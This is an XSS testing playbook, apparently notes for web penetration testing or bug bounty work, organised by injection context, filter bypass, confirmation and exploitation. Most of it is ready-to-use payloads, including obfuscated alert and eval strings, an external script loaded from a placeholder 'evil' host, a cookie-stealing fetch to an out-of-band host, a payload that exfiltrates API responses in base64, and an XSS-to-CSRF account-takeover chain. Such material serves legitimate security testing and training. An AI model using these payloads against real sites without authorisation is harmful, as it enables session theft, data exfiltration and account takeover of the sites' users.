# XSS — playbook

## when to try
- Anywhere user input lands in the DOM. Reflected (URL → page), stored (DB → page), DOM-based (JS sinks).

## fingerprint contexts (matters for payload choice)
- HTML body: `<script>alert(1)</script>` if no filtering; otherwise inject tag attributes.
- HTML attribute (single/double-quoted): break out with `"`, `'`, then `onload=`, `onerror=`.
- HTML attribute (unquoted): space terminates → ` onmouseover=alert(1) `.
- JS string context: break out of `'`/`"`, then `;alert(1);//`.
- JS template literal: `${alert(1)}`.
- URL context (href/src): `javascript:alert(1)`. Modern browsers block in some places but not all.
- CSS context: `expression(alert(1))` (legacy IE only — dead). `</style><svg/onload=...>` to break out.
- JSON in JS: `</script><script>alert(1)</script>`.
- SVG: `<svg onload=alert(1)>` — works in many "XSS-safe" markdown renderers.

## bypass tricks
- Tag-blocklist: try `<svg>`, `<math>`, `<details/open/ontoggle=alert(1)>`, `<iframe>`, `<form>`, `<frameset>`.
- Event-blocklist: try rare events — `onpointerenter`, `ontoggle`, `onhashchange`, `onbeforetoggle` (popover API).
- Filter strips `<script>`: build payload with `<a href=javascript:...>click</a>` or `<svg/onload=...>`.
- Filter lowercases: try mixed `<sCRipt>`.
- Filter strips spaces: use `/` as separator: `<svg/onload=alert(1)>`.
- WAF on `alert`: `top['ale'+'rt'](1)`, `prompt`, `print`, `eval(atob('YWxlcnQoMSk='))`.
- Length-limited: external JS via `<script src=//evil/x></script>` — and the URL can be short.
- HTML-encoded payload: many filters decode after escaping → double-encode bypass.
- DOMPurify gaps over time: keep an eye on changelogs for mutation XSS.

## confirmation flow
1. Inject `<script>alert(REDXSS)</script>`. Even an alert in your own browser is enough for repro on a real target.
2. For reflected: build a click-once URL.
3. For stored: prove cross-account impact (account A injects, account B sees the alert).

## exploitation
- Cookie steal `<script>fetch('//oob/'+document.cookie)</script>` — but `HttpOnly` defeats; pivot to:
- DOM-only impact: read `localStorage`, `sessionStorage`, `document.body.innerHTML`.
- Account takeover via CSRF chain: XSS auto-submits a "change email" form → password reset to attacker's email.
- Read API responses: `fetch('/api/me').then(r=>r.text()).then(t=>fetch('//oob?'+btoa(t)))`.

## caveats
- Self-XSS (only your own session) → not a bug.
- "It alerted in Burp's preview" → not a bug. Repro in a real browser.
- BXSS / blind XSS via interactsh's XSS Hunter — for inputs that admins later view (support tickets, logs).

## provenance
PortSwigger XSS labs (~70 total, biggest topic). PayloadsAllTheThings/XSS.
